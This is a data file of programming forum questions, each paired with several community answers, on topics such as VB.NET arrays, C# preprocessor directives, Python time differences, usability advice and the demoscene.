{"instruction": "This has been driving me crazy for a few days.  Why doesn't the following work?\n\n    Dim arr(3, 3) As Integer\n\n    For y As Integer = 0 To arr.GetLength(0) - 1\n        For x As Integer = 0 To arr.GetLength(y) - 1\n            arr(y, x) = y + x\n        Next\n    Next\n\n\nAlso, what if the array looked like this instead?\n{ {1, 2, 3},\n  {4, 5, 6, 7, 8, 9, 9, 9},\n  {5, 4, 3, 2}\n}", "output": "Your declaration: DIM arr(3,3) As Integer allready specifies that there are 3 elements in any given row (or 4, I'm not so sure about VB)\nYou could try:\nDim arr(3) as Integer()\n\nYou should then be able to do:\narr(n).Length\n\nTo find the length of row n.\nI'm a bit rusty on VB6 and never learned VB.NET, but this should give you a 'jagged' array. Check out the msdn documentation on multidimensioned arrays."}
{"instruction": "This has been driving me crazy for a few days.  Why doesn't the following work?\n\n    Dim arr(3, 3) As Integer\n\n    For y As Integer = 0 To arr.GetLength(0) - 1\n        For x As Integer = 0 To arr.GetLength(y) - 1\n            arr(y, x) = y + x\n        Next\n    Next\n\n\nAlso, what if the array looked like this instead?\n{ {1, 2, 3},\n  {4, 5, 6, 7, 8, 9, 9, 9},\n  {5, 4, 3, 2}\n}", "output": "Dim arr(3, 3) As Integer\nDim y As Integer\nDim x As Integer\n\nFor x = 0 To arr.Rank - 1\n    For y = 0 To arr.GetLength(x) - 2\n        arr(x, y) = x + y\n    Next\nNext\n\nThe above code worked for me. \nEdit, the code feels dirty though.  I'm wondering what it is you are trying to accomplish?"}
{"instruction": "This has been driving me crazy for a few days.  Why doesn't the following work?\n\n    Dim arr(3, 3) As Integer\n\n    For y As Integer = 0 To arr.GetLength(0) - 1\n        For x As Integer = 0 To arr.GetLength(y) - 1\n            arr(y, x) = y + x\n        Next\n    Next\n\n\nAlso, what if the array looked like this instead?\n{ {1, 2, 3},\n  {4, 5, 6, 7, 8, 9, 9, 9},\n  {5, 4, 3, 2}\n}", "output": "Ok, so what you really need is a \"jagged array\". This will allow you to have an \"array that contains other arrays of varying lengths\".\n  Dim arr As Integer()() = {New Integer() {1, 2, 3}, New Integer() {4, 5, 6, 7, 8, 9, 9, 9}, New Integer() {5, 4, 3, 2}}\n\n  For x = 0 To arr.GetUpperBound(0)\n      Console.WriteLine(\"Row \" & x & \" has \" & arr(x).GetUpperBound(0) & \" columns\")\n      For y = 0 To arr(x).GetUpperBound(0)\n          Console.WriteLine(\"(\" & x & \",\" & y & \") = \" & arr(x)(y))\n      Next\n   Next\n\nOutput: \nRow 0 has 2 columns\n(0,0) = 1\n(0,1) = 2\n(0,2) = 3\nRow 1 has 7 columns\n(1,0) = 4\n(1,1) = 5\n(1,2) = 6\n(1,3) = 7\n(1,4) = 8\n(1,5) = 9\n(1,6) = 9\n(1,7) = 9\nRow 2 has 3 columns\n(2,0) = 5\n(2,1) = 4\n(2,2) = 3\n(2,3) = 2"}
{"instruction": "I wish I were a CSS smarty .... \nHow can you place a div container in the lower left-hand corner of the web page; taking into account the users scroll-position?", "output": "This works Just fine in IE7 and FF.  It puts the div in the bottom left hand corner and stays there as you scroll. If this isn't the solution can you please elaborate?\n.bottom { position:fixed; bottom:0%; left:0% }"}
{"instruction": "Non technical people in most cases do not see any value in writing unit tests. They just want to have basic code completed and do not spend money and time on such things like unit tests. Later, every day they just to ask to fix a one bug more. Projects are missing deadlines and they still don't see value in good automated tests.", "output": "Try using an analog.  Ask them if they would like their kids driving Volvos or Kit cars made by some guy down the street.  The answer should always be the Volvo.  Then ask why?  The answe ris it is more reliable and safe.  How do they know.  The answer is testing.  All automobiles are tested to an extreme and the cost relflects that.  If they want there software to be as reliable as possible as possible they need tests.  (Or they become the crash test dummies)"}
{"instruction": "Non technical people in most cases do not see any value in writing unit tests. They just want to have basic code completed and do not spend money and time on such things like unit tests. Later, every day they just to ask to fix a one bug more. Projects are missing deadlines and they still don't see value in good automated tests.", "output": "Selling complete unit testing after development has already started is very hard. I would even go so far as to say that it is often impossible. If you don't get buy in from all project stakeholders for complete unit testing up front, then you should be happy for whatever unit testing that you can squeak in."}
{"instruction": "Non technical people in most cases do not see any value in writing unit tests. They just want to have basic code completed and do not spend money and time on such things like unit tests. Later, every day they just to ask to fix a one bug more. Projects are missing deadlines and they still don't see value in good automated tests.", "output": "The best way is to not get so technical with \"non techical\" people.  Just build it into the delivery time without going into details.  \nOn the flipside, it sounds like the project deadlines were not realistic to actually build it."}
{"instruction": "Non technical people in most cases do not see any value in writing unit tests. They just want to have basic code completed and do not spend money and time on such things like unit tests. Later, every day they just to ask to fix a one bug more. Projects are missing deadlines and they still don't see value in good automated tests.", "output": "@Craig, I thought about the car analog as well, but I think the analogy falls apart since it sounds like there is already testing present in the project and it is simply a matter of degree. In that case the car analogy becomes \"Do you care if the dome light in the car gets tested as long as the critical systems (brakes, headlights, transmission, etc) are tested\". As a harried project sponsor that is seeing the project go past it's end date, I don't really care if the dome light gets tested or not."}
{"instruction": "Non technical people in most cases do not see any value in writing unit tests. They just want to have basic code completed and do not spend money and time on such things like unit tests. Later, every day they just to ask to fix a one bug more. Projects are missing deadlines and they still don't see value in good automated tests.", "output": "You don't.  Tests shouldn't be something that are written separately so there's no more need to account for them in the schedule than you would specifically schedule \"compiling\" or \"typing in the code\".  Any time spent writing the tests should be offset by the time they save you anyway."}
{"instruction": "Non technical people in most cases do not see any value in writing unit tests. They just want to have basic code completed and do not spend money and time on such things like unit tests. Later, every day they just to ask to fix a one bug more. Projects are missing deadlines and they still don't see value in good automated tests.", "output": "One good way to sell the value of unit tests is from a support standpoint -- if you are using a unit testing framework that has a runtime that can be deployed (nUnit is one), you can have a \"Run Unit Tests\" menu item on your help menu.  This can run all of the unit tests, and the results can be sent to tech support to help debug client problems.\nObviously there are a lot of ways you could go about selling the increased stability, but tech support is a \"real money\" cost that most managers would want to lower."}
{"instruction": "Non technical people in most cases do not see any value in writing unit tests. They just want to have basic code completed and do not spend money and time on such things like unit tests. Later, every day they just to ask to fix a one bug more. Projects are missing deadlines and they still don't see value in good automated tests.", "output": "Well I think the problem is you are say \"all functions\". All functions don't need unit tests, and some would argue that unit testing individual functions at all is down-right wrong in many scenarios.\nInstead, I recommend unit testing actual \"units of functionality\". Instead of writing a single test for each function, write a test for each scenario or feature. Besides saving you lots of time and allowing you to slip in the tests in under the radar, it is often far more accurate because it literally tests the functions they way they are being used. Too often function by function unit tests don't test the right thing, or even worse, test mocks. \nI recommend you avoid using mocks in testing at all costs. The use of a mock essentially invalidates the test because you are testing how it works in idealized circumstances instead of how it works in the real world.\nA side benefit is that you also get better dead-code detection. Any code that isn't covered by a high level test probably isn't being used and can be removed. Never underestimate the value of eliminating dead code."}
{"instruction": "Non technical people in most cases do not see any value in writing unit tests. They just want to have basic code completed and do not spend money and time on such things like unit tests. Later, every day they just to ask to fix a one bug more. Projects are missing deadlines and they still don't see value in good automated tests.", "output": "I just wrote at length about this very topic.\nTo summarize my arguments against the common complaints:\nClean-up is invisible to users; we need to add new features.\nThe bugs constantly produced by messy code are visible to users too. Time spent fixing those bugs could have been spent adding features. The longer we stay in quality debt, the more time it takes to add each new feature.\nWe don't have time for clean-up.\nYou'd rather spend your time fixing bugs generated by the problem rather than fixing the problem? That's like whacking weeds every weekend instead of pulling them up by the roots. Prevention is sixteen times more valuable than cure.\nDevelopers got themselves into this mess; they should get themselves out of it on their own time.\nHad developers not gotten releases out the door as fast as they did, had they not responded so swiftly to early adopter feedback, even when the product morphed into a beast quite different from its original conception, we wouldn't have our current customers and revenue. We'd be working for another company, not complaining about the software we built.\nAttention CEO's: Finger-pointing impedes resolution. Instead, challenge your developers to reduce bug reports. This is easily measured, so you can track time versus results. Remember, developers prefer implementing new features to fixing bugs, so if they're begging for time to fix bugs, it's serious."}
{"instruction": "Non technical people in most cases do not see any value in writing unit tests. They just want to have basic code completed and do not spend money and time on such things like unit tests. Later, every day they just to ask to fix a one bug more. Projects are missing deadlines and they still don't see value in good automated tests.", "output": "Just do it.  You will be slower in the beginning as you are writing more code and thinking out the problem first.  But you will quickly pass others on the project as you have less errors/bugs and your design is better.\nIf you design the system with testing in mind, it will be inherently more flexible a design than a non-testable.  It will then be quicker to add features to in the future."}
{"instruction": "Any ideas what the average user's download speed is? I'm working on a site that streams video and am trying to figure out what an average download speed as to determine quality.\nI know i might be comparing apples with oranges but I'm just looking for something to get a basis for where to start.", "output": "You could try looking at the lower tier offerings from AT&T and Comcast.  Probably 1.5 Mbps for the basic level (which I imagine most people get).\nThe \"test your bandwidth\" sites may have some stats on this, too."}
{"instruction": "Any ideas what the average user's download speed is? I'm working on a site that streams video and am trying to figure out what an average download speed as to determine quality.\nI know i might be comparing apples with oranges but I'm just looking for something to get a basis for where to start.", "output": "It would depend on the geography that you are targeting. For example, in India, you can safely assume it would be a number below 256kbps."}
{"instruction": "Any ideas what the average user's download speed is? I'm working on a site that streams video and am trying to figure out what an average download speed as to determine quality.\nI know i might be comparing apples with oranges but I'm just looking for something to get a basis for where to start.", "output": "Speedtest.net has a lot of stats broken down by country, region, city and ISP. Not sure about accuracy, since it's only based on the people using their \"bandwidth measurement\" service."}
{"instruction": "Any ideas what the average user's download speed is? I'm working on a site that streams video and am trying to figure out what an average download speed as to determine quality.\nI know i might be comparing apples with oranges but I'm just looking for something to get a basis for where to start.", "output": "There are a lot of factors involved (server bandwidth, local ISP, network in between, etc) which make it difficult to give a hard answer.  With my current ISP, I typically get 200-300 kB/sec.  Although when the planets align I've gotten as much as 2 MB/sec (the \"quoted\" peak downlink speed).  That was with parallel streams, however.  The peak bandwidth I've achieved on a single stream is 1.2 MB/sec"}
{"instruction": "Any ideas what the average user's download speed is? I'm working on a site that streams video and am trying to figure out what an average download speed as to determine quality.\nI know i might be comparing apples with oranges but I'm just looking for something to get a basis for where to start.", "output": "The best strategy is always to give your users options. Why don't you start the stream at a low bitrate that will work for everyone and provide a \"High Quality\" link for those of us with FTTH connections? I believe YouTube has started doing this."}
{"instruction": "Any ideas what the average user's download speed is? I'm working on a site that streams video and am trying to figure out what an average download speed as to determine quality.\nI know i might be comparing apples with oranges but I'm just looking for something to get a basis for where to start.", "output": "Try attacking it from the other angle.  Look at streaming services that cater to the customer you want, and have significant volume (maybe youtube) and see what they're pushing.  You'll find there'a pretty direct correlation between alexa rating (popularity) and quality(minimum bitrate required).  Vimeo will always have fewer users than Youtube because the user experience is poor for low bitrate users.\nThere are many other factors, and this should only form one small facet of your bandwidth decision, but it's a useful comparison to make.\nKeep in mind, however, that you want to degrade gracefully.  As more and more sites come online you'll start bumping into ISPs that limit total transfer, and being able to tell your customers how much of their bandwidth your site is consuming is useful, as well as proclaiming that you are a low bandwidth site.\nFurther, more and more users are using portable cellular connections (iPhone) where limited bandwidth is a big deal.  AT&T has oversold many markets so being able to get useful video through a tiny link will enable you to capture market that vimeo and Hulu cannot.\nQuite frankly, though, the best thing to do is degrade on the fly gracefully.  Measure the bandwidth of the connection continuously and adjust bandwidth as needed for a smooth playback experience with good audio.  Then you can take all users across the gamut..."}
{"instruction": "Any ideas what the average user's download speed is? I'm working on a site that streams video and am trying to figure out what an average download speed as to determine quality.\nI know i might be comparing apples with oranges but I'm just looking for something to get a basis for where to start.", "output": "According to CWA, the average US resident has a 1.9Mbps download speed.  They have data by state, so if you have money then you can probably get a more specific report for your intended audience.  Keep in mind, however, that more and more people are sharing this with multiple computers, using VOIP devices, and running background processes that consume bandwidth."}
{"instruction": "So I have about 10 short css files that I use with mvc app.\nThere are like\nerror.css\nlogin.css\netc...\nJust some really short css files that make updating and editing easy (At least for me). What I want is something that will optimize the if else branch and not incorporate it within the final bits. I want to do something like this\nif(Debug.Mode){\n\n<link rel=\"stylesheet\" type=\"text/css\" href=\"error.css\" /> \n<link rel=\"stylesheet\" type=\"text/css\" href=\"login.css\" /> \n<link rel=\"stylesheet\" type=\"text/css\" href=\"menu.css\" /> \n<link rel=\"stylesheet\" type=\"text/css\" href=\"page.css\" /> \n} else {\n<link rel=\"stylesheet\" type=\"text/css\" href=\"site.css\" /> \n}\n\nI'll have a msbuild task that will combine all the css files, minimize them and all that good stuff. I just need to know if there is a way to remove the if else branch in the final bits.", "output": "I should had used google.\n#if DEBUG\n    Console.WriteLine(\"Debug mode.\") \n#else \n    Console.WriteLine(\"Release mode.\") \n#endif \n\nMake sure that the option \"Configuration settings\" -> \"Build\" \"Define DEBUG \nconstant\" in the project properties is checked."}
{"instruction": "So I have about 10 short css files that I use with mvc app.\nThere are like\nerror.css\nlogin.css\netc...\nJust some really short css files that make updating and editing easy (At least for me). What I want is something that will optimize the if else branch and not incorporate it within the final bits. I want to do something like this\nif(Debug.Mode){\n\n<link rel=\"stylesheet\" type=\"text/css\" href=\"error.css\" /> \n<link rel=\"stylesheet\" type=\"text/css\" href=\"login.css\" /> \n<link rel=\"stylesheet\" type=\"text/css\" href=\"menu.css\" /> \n<link rel=\"stylesheet\" type=\"text/css\" href=\"page.css\" /> \n} else {\n<link rel=\"stylesheet\" type=\"text/css\" href=\"site.css\" /> \n}\n\nI'll have a msbuild task that will combine all the css files, minimize them and all that good stuff. I just need to know if there is a way to remove the if else branch in the final bits.", "output": "Compiler constants. I don't remember the C# syntax, but this is how I do it in VB:\n#If CONFIG = \"Debug\" Then\n  'do somtehing\n#Else\n  'do something else\n#EndIf"}
{"instruction": "Any ideas what the average user's download speed is? I'm working on a site that streams video and am trying to figure out what an average download speed as to determine quality.\nI know i might be comparing apples with oranges but I'm just looking for something to get a basis for where to start.", "output": "Wow.\nThis is so dependent on the device, connection method, connection type, ISP throttling, etc. involved in the end-to-end link.\nTo try and work out an average speed would be fairly impossible.\nThink, fat pipe at home (8Gb plus) versus bad wireless connection provided for free at the airport (9.6kb) and you can start to get an idea of the range of connections you're trying to average over.\nThen we move onto variations in screen sizes and device capabilities.\nMaybe trawl the UA stings of incoming connectins to get an idea of the capabilities of the user devices being used out there.\nMaybe see if you can use some sort of geolocation solution to try and see how people are connecting to your site to get an idea of connection capabilities as well.\nAre you offering the video in a fixed format, i.e. X x Y pixel size?\nHTH.\ncheers,\nRob"}
{"instruction": "Any ideas what the average user's download speed is? I'm working on a site that streams video and am trying to figure out what an average download speed as to determine quality.\nI know i might be comparing apples with oranges but I'm just looking for something to get a basis for where to start.", "output": "If I'm using your site, \"average\" doesn't matter.  All I care about is MY experience, and so  you either need to make the site adaptive, design for a pretty low speed (iPhone 2G gets you 70-80 kbps if you're lucky, to take one common case), or be very clear about the requirements so I can decide whether or not my connection-of-the-moment will work or not.\nWhat you don't want to subject your users to is unpredictably choppy, intermittent video and audio."}
{"instruction": "So I have about 10 short css files that I use with mvc app.\nThere are like\nerror.css\nlogin.css\netc...\nJust some really short css files that make updating and editing easy (At least for me). What I want is something that will optimize the if else branch and not incorporate it within the final bits. I want to do something like this\nif(Debug.Mode){\n\n<link rel=\"stylesheet\" type=\"text/css\" href=\"error.css\" /> \n<link rel=\"stylesheet\" type=\"text/css\" href=\"login.css\" /> \n<link rel=\"stylesheet\" type=\"text/css\" href=\"menu.css\" /> \n<link rel=\"stylesheet\" type=\"text/css\" href=\"page.css\" /> \n} else {\n<link rel=\"stylesheet\" type=\"text/css\" href=\"site.css\" /> \n}\n\nI'll have a msbuild task that will combine all the css files, minimize them and all that good stuff. I just need to know if there is a way to remove the if else branch in the final bits.", "output": "Specifically, like this in C#:\n#if (DEBUG)\n   Debug Stuff\n#endif\n\nC# has the following preprocessor directives:\n#if \n#else \n#elif // Else If\n#endif\n#define\n#undef // Undefine\n#warning // Causes the preprocessor to fire warning\n#error // Causes the preprocessor to fire a fatal error\n#line // Lets the preprocessor know where this source line came from\n#region // Codefolding\n#endregion"}
{"instruction": "I have 2 time values which have the type datetime.time. I want to find their difference. The obvious thing to do is t1 - t2, but this doesn't work. It works for objects of type datetime.datetime but not for datetime.time. So what is the best way to do this?", "output": "It seems that this isn't supported, since there wouldn't be a good way to deal with overflows in datetime.time.  I know this isn't an answer directly, but maybe someone with more python experience than me can take this a little further.  For more info, see this: http://bugs.python.org/issue3250"}
{"instruction": "I have 2 time values which have the type datetime.time. I want to find their difference. The obvious thing to do is t1 - t2, but this doesn't work. It works for objects of type datetime.datetime but not for datetime.time. So what is the best way to do this?", "output": "You could transform both into timedelta objects and subtract these from each other, which will take care to of the carry-overs. For example:\n>>> import datetime as dt\n>>> t1 = dt.time(23, 5, 5, 5)\n>>> t2 = dt.time(10, 5, 5, 5)\n>>> dt1 = dt.timedelta(hours=t1.hour, minutes=t1.minute, seconds=t1.second, microseconds=t1.microsecond)\n>>> dt2 = dt.timedelta(hours=t2.hour, minutes=t2.minute, seconds=t2.second, microseconds=t2.microsecond)\n>>>  print(dt1-dt2)\n13:00:00\n>>> print(dt2-dt1)\n-1 day, 11:00:00\n>>> print(abs(dt2-dt1))\n13:00:00\n\nNegative timedelta objects in Python get a negative day field, with the other fields positive. You could check beforehand: comparison works on both time objects and timedelta objects:\n>>> dt2 < dt1\nTrue\n>>> t2 < t1\nTrue"}
{"instruction": "I have 2 time values which have the type datetime.time. I want to find their difference. The obvious thing to do is t1 - t2, but this doesn't work. It works for objects of type datetime.datetime but not for datetime.time. So what is the best way to do this?", "output": "Firstly, note that a datetime.time is a time of day, independent of a given day, and so the different between any two datetime.time values is going to be less than 24 hours.\nOne approach is to convert both datetime.time values into comparable values (such as milliseconds), and find the difference.\nt1, t2 = datetime.time(...), datetime.time(...)\n\nt1_ms = (t1.hour*60*60 + t1.minute*60 + t1.second)*1000 + t1.microsecond\nt2_ms = (t2.hour*60*60 + t2.minute*60 + t2.second)*1000 + t2.microsecond\n\ndelta_ms = max([t1_ms, t2_ms]) - min([t1_ms, t2_ms])\n\nIt's a little lame, but it works."}
{"instruction": "This is the text from MSDN comment: \"According to the book ATL Internals (2ed) the use of attributes is deprecated and should not be used in new ATL projects.\"\nBut WHY?!!", "output": "In ATL these attributes were a compiler trick. They were not a core part of the platform like attributes in C#. They were also more confusing to debug than macros's and the method of dumping generated attribute code was a hassle.\nI suspect another issue is likely to have been C++ compiler compatibility and standards-adherence. Attributes didn't make for more beautiful C++ code, and perhaps this syntax may be used in a future version of a real C++ standard."}
{"instruction": "I have 2 time values which have the type datetime.time. I want to find their difference. The obvious thing to do is t1 - t2, but this doesn't work. It works for objects of type datetime.datetime but not for datetime.time. So what is the best way to do this?", "output": "Also a little silly, but you could try picking an arbitrary day and embedding each time in it, using datetime.datetime.combine, then subtracting:\n>>> import datetime\n>>> t1 = datetime.time(2,3,4)\n>>> t2 = datetime.time(18,20,59)\n>>> dummydate = datetime.date(2000,1,1)\n>>> datetime.datetime.combine(dummydate,t2) - datetime.datetime.combine(dummydate,t1)\ndatetime.timedelta(0, 58675)"}
{"instruction": "I'm not a usability specialist, and I really don't care to be one.\nI just want a small set of rules of thumb that I can follow while coding my User Interfaces so that my product has decent usability.\nAt first I thought that this question would be easy to answer \"Use your common sense\", but if it's so common among us developers we wouldn't, as a group, have a reputation for our horrible interfaces.\nAny Suggestions?", "output": "Read Don't Make Me Think by Steve Krug.  It is a great starting point, and an easy short read.\nEDIT: This is mainly for web usability though, but it would still be a good read even if you are doing rich clients."}
{"instruction": "I'm not a usability specialist, and I really don't care to be one.\nI just want a small set of rules of thumb that I can follow while coding my User Interfaces so that my product has decent usability.\nAt first I thought that this question would be easy to answer \"Use your common sense\", but if it's so common among us developers we wouldn't, as a group, have a reputation for our horrible interfaces.\nAny Suggestions?", "output": "Don't make things work in a different way than your users are expecting (i.e. breaking the \"back\" button when using Ajax in web forms\nFollow the K.I.S.S principal\n\nReally, any rules someone posts will be a variation on the theme:\nDon't Make Your Users Think\n\"Don't Make Me Think\" has already been posted, see also\nDesign of Everyday Things and Designing with Web Standards which are also great for light usability reading."}
{"instruction": "I'm not a usability specialist, and I really don't care to be one.\nI just want a small set of rules of thumb that I can follow while coding my User Interfaces so that my product has decent usability.\nAt first I thought that this question would be easy to answer \"Use your common sense\", but if it's so common among us developers we wouldn't, as a group, have a reputation for our horrible interfaces.\nAny Suggestions?", "output": "The single most important piece of advice I'd give someone is to work on the UI first. Pen and paper and all. That way, you won't subconsciously couple buttons to functions, input fields to variables, etc.\nThe best UI might be a pain to code, and if your backend code is mostly written, it will sabotage your thinking.\nOther than that, I'd point to Apple's Human Interface Guidelines. Of course, if your platform is not OSX, take the OSX sections with a lot of salt. What works in OSX might not work on Windows. You should embrace your platform's idioms.\nOSX stuff aside, that document has some pretty good starting points on the fundamentals."}
{"instruction": "I'm not a usability specialist, and I really don't care to be one.\nI just want a small set of rules of thumb that I can follow while coding my User Interfaces so that my product has decent usability.\nAt first I thought that this question would be easy to answer \"Use your common sense\", but if it's so common among us developers we wouldn't, as a group, have a reputation for our horrible interfaces.\nAny Suggestions?", "output": "Source: http://stuffthathappens.com/blog/wp-content/uploads/2008/03/simplicity.png"}
{"instruction": "I'm not a usability specialist, and I really don't care to be one.\nI just want a small set of rules of thumb that I can follow while coding my User Interfaces so that my product has decent usability.\nAt first I thought that this question would be easy to answer \"Use your common sense\", but if it's so common among us developers we wouldn't, as a group, have a reputation for our horrible interfaces.\nAny Suggestions?", "output": "I've posted related questions:\n\nWhat metrics for GUI usability do you know?\nGUI design techinques to enhance user experience"}
{"instruction": "mime_content_type() is deprecated.\nHow can I find the MIME type of a local file using PHP5 but without using this deprecated method or the PECL fileinfo extension?\nEdit: That's what I was afraid of.  It's unfortunate that they deprecated a built-in function in favour of one that requires an extension that isn't always available.", "output": "If you can't use the fileinfo extension, and you don't want to use mime_content_type, your options are limited.\nMost likely you'll need to do a lookup based on the file extension.  mime_content_type did something a bit more intelligent and actually looked for special data in the file to determine the mime type."}
{"instruction": "I'm not a usability specialist, and I really don't care to be one.\nI just want a small set of rules of thumb that I can follow while coding my User Interfaces so that my product has decent usability.\nAt first I thought that this question would be easy to answer \"Use your common sense\", but if it's so common among us developers we wouldn't, as a group, have a reputation for our horrible interfaces.\nAny Suggestions?", "output": "Avoid modes. It's frustrating to a user when input works sometimes but not others, or does different things at different times."}
{"instruction": "I grew up learning to code based on what I've experienced with the demoscene.  It seems to be a pretty sparse subculture in the US.  How many developers watch or participate in the scene?\nTeaser: If you haven't checked out the scene before, take a look at one of my favorites: Debris by Farbrausch.  Watch on demoscene.tv or download the app (179k) and run it yourself.  No video, all realtime rendering and audio.  Think, a small group of guys wrote this for a competition on their free time.", "output": "I try to keep an eye on http://pouet.net, myself. I can't say I've participated in the scene, but I wrote some little demo effects in x86 asm when I was younger. Mode 13h, fire effects, particles, rotozooming, that sort of thing.\nI'd say the demoscene definitely influenced my coding interests.\nEdit: does anyone else remember the PC-GPE? Ah, memories."}
{"instruction": "I grew up learning to code based on what I've experienced with the demoscene.  It seems to be a pretty sparse subculture in the US.  How many developers watch or participate in the scene?\nTeaser: If you haven't checked out the scene before, take a look at one of my favorites: Debris by Farbrausch.  Watch on demoscene.tv or download the app (179k) and run it yourself.  No video, all realtime rendering and audio.  Think, a small group of guys wrote this for a competition on their free time.", "output": "I remember the PC-GPE!  I used to chat with Mark on IRC... nice guy.\nAnd yeah, I grew up with the demoscene and visit pouet (and nectarine) from time to time."}
{"instruction": "When an application is behind another applications and\nI click on my application's taskbar icon, I expect the entire application to\ncome to the top of the z-order, even if an app-modal, WS_POPUP dialog box is\nopen.\nHowever, some of the time, for some of my (and others') dialog boxes, only the dialog box comes to the front; the rest of the application stays behind.\nI've looked at Spy++ and for the ones that work correctly, I can see\nWM_WINDOWPOSCHANGING being sent to the dialog's parent. For the ones that\nleave the rest of the application behind, WM_WINDOWPOSCHANGING is not being\nsent to the dialog's parent.\nI have an example where one dialog usually brings the whole app with it and the other does not. Both the working dialog box and the non-working dialog box have the same window style, substyle, parent, owner, ontogeny.\nIn short, both are WS_POPUPWINDOW windows created with DialogBoxParam(),\nhaving passed in identical HWNDs as the third argument.\nHas anyone else noticed this behavioral oddity in Windows programs? What messages does the TaskBar send to the application when I click its button? Who's responsibility is it to ensure that all of the application's windows come to the foreground?\nIn my case the base parentage is an MDI frame...does that factor in somehow?", "output": "Is the dialog's parent window set correctly?\nAfter I posted this, I started my own Windows Forms application and reproduced the problem you describe. I have two dialogs, one works correctly the other does not and I can't see any immediate reason is to why they behave differently. I'll update this post if I find out.\nRaymond Chen where are you!"}
{"instruction": "I'm tearing my hair out with this one. If I start a block comment /* in VS.NET 2005+ then carriage return, Visual Studio insists that I have another asterisk *. I know there's an option to turn this off but I just can't find it. Anyone know how to turn this feature off?", "output": "This post addresses your question. The gist of it is:\nText Editor > C# > Advanced > Generate XML documentation comments for ///"}
{"instruction": "Is it still worth to add the log4j library to a Java 5 project just to log\nlet's say some exceptions to a file with some nice rollover settings.\nOr will the standard util.logging facility do the job as well?\nWhat do you think?", "output": "log4j is a much nicer package overall, and doesn't have some of the hiccups that java.util.logging contains.  I'd second that using log4j directly is easier than using the commons logging."}
{"instruction": "For many years I have used two great tools BoundsChecker & Purify, but the developers of these applications have let me down, they no longer put effort into maintaining them or developing them. We have corporate accounts with both companies, and they both tell me that they have no intention of producing versions to support 64 bit applications.\nCan anyone recommend either open source or commercial alternatives that support 64 bit native C++/MFC applications?", "output": "Parasoft has a tool called Insure++ (link: http://www.parasoft.com/jsp/products/quick_facts.jsp?product=Insure) which says it'll do that.\nI've used Insure++ on 32-bit and 64-bit apps on Linux and it worked okay.  It sometimes got confused when it was trying to parse template/stl code and would fall over.\nThat url says it works on 32- and 64-bit windows, good luck!"}
{"instruction": "Which class design is better and why?\npublic class User\n{\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee : User\n{\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member : User\n{\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}\n\nOR\npublic class User\n{\n    public String UserId;\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee\n{\n    public User UserInfo;\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member\n{\n    public User UserInfo;\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}", "output": "Nice question although to avoid distractions about right and wrong I'd consider asking for the pros and cons of each approach -- I think that's what you meant by which is better or worse and why. Anyway ....\nThe First Approach aka Inheritance\nPros:\n\nAllows polymorphic behavior.\nIs initially simple and convenient.\n\nCons:\n\nMay become complex or clumsy over time if more behavior and relations are added.\n\nThe Second Approach aka Composition\nPros:\n\nMaps well to non-oop scenarios like relational tables, structured programing, etc\nIs straightforward (if not necessarily convenient) to incrementally extend relations and behavior.\n\nCons:\n\nNo polymorphism therefore it's less convenient to use related information and behavior\n\nLists like these + the questions Jon Limjap mentioned will help you make decisions and get started -- then you can find what the right answers should have been ;-)"}
{"instruction": "I want to show a chromeless modal window with a close button in the upper right corner.\nIs this possible?", "output": "The WPF SDK Team posted a EXCELLENT article about chromeless windows available here:\nhttp://blogs.msdn.com/wpfsdk/archive/2008/09/08/custom-window-chrome-in-wpf.aspx\nThis is a MUST read!!!\nUPDATED\n\nAlso found this article by Lester Lebo on how to use the WPF Shell Integration Library for a custom window chrome"}
{"instruction": "I grew up learning to code based on what I've experienced with the demoscene.  It seems to be a pretty sparse subculture in the US.  How many developers watch or participate in the scene?\nTeaser: If you haven't checked out the scene before, take a look at one of my favorites: Debris by Farbrausch.  Watch on demoscene.tv or download the app (179k) and run it yourself.  No video, all realtime rendering and audio.  Think, a small group of guys wrote this for a competition on their free time.", "output": "I am going to date myself here. I remember the demo scene from the days of of the 386/486 VGA mode 13h and .mod files, when demos were downloaded from bulletin boards. Looking at Debris, things have sure come a long way."}
{"instruction": "For a project I'm working on. I need to look for an executable on the filesystem. For UNIX derivatives, I assume the user has the file in the mighty $PATH variable, but there is no such thing on Windows.\nI can safely assume the file is at most 2 levels deep into the filesystem, but I don't know on what drive it will be. I have to try all drives, but I can't figure out how to list all available drives (which have a letter assigned to it).\nAny help?\nEDIT: I know there is a %PATH% variable, but it is not as integrated as in UNIX systems. For instance, the application I'm looking for is OpenOffice. Such software would not be in %PATH%, typically.", "output": "Of course there is a PATH environment variable in Windows.\n\n\n%PATH%\n    This variable contains a semicolon-delimited list of directories in which the command interpreter will search for executable files. Equivalent to the UNIX $PATH variable."}
{"instruction": "For a project I'm working on. I need to look for an executable on the filesystem. For UNIX derivatives, I assume the user has the file in the mighty $PATH variable, but there is no such thing on Windows.\nI can safely assume the file is at most 2 levels deep into the filesystem, but I don't know on what drive it will be. I have to try all drives, but I can't figure out how to list all available drives (which have a letter assigned to it).\nAny help?\nEDIT: I know there is a %PATH% variable, but it is not as integrated as in UNIX systems. For instance, the application I'm looking for is OpenOffice. Such software would not be in %PATH%, typically.", "output": "Windows does indeed have a PATH environment variable. It has a different syntax from the Unix one because it uses semicolon (;) as a separator instead of colon (:) and you have to watch for quoted strings that might contain spaces. But, it's there.\nIf this other program's installer adds its own directory to the PATH environment variable, then you could rely on that. However, as you mention, Windows installers typically do not need to add the application path to the PATH because they install a start menu shortcut or something else instead.\nFor drive letters in Java, one approach would be to try them all, there are only going to be at most 24 (C through Z) that are of any use. Or, you could shell out and run \"net use\" and parse the results, though that is a bit messier."}
